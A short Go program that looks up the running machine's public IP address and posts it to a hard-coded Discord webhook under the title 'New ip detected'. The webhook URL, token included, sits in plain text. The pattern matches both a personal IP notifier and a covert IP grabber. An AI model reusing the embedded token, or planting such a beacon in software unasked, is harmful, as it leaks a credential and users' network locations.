package main

import (
	"fmt"
	"main/ipinfo"
	"main/webhook"
)

func main() {
	info, err := ipinfo.GetInfo()
	if err != nil {
		panic(err)
	}

	title := "New ip detected"
	description := fmt.Sprintf("||`%s`||", info.IP)

	msg := &webhook.Message{
		Embeds: &[]webhook.Embed{
			{
				Title:       &title,
				Description: &description,
			},
		},
	}

	err = webhook.SendMessage("https://discord.com/api/webhooks/1235998390282620928/YMhil0KH16QKk0GdzjgUsmYJi1euFWStQqU_kdePaiRcWqGhe_ZayioaL1_CfDajkpY4", msg)
	if err != nil {
		panic(err)
	}
}
